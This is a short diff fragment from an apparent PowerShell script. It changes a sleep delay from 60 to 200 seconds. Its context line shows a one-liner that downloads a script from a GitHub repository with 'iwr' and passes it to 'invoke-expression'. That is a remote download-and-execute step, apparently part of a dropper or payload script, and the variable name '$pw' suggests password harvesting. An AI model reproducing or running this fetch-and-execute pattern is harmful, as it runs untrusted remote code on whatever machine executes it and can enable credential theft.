@@ -7,7 +7,7 @@ $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expres
 
 
 
-start-sleep 60
+start-sleep 200
 
 
 
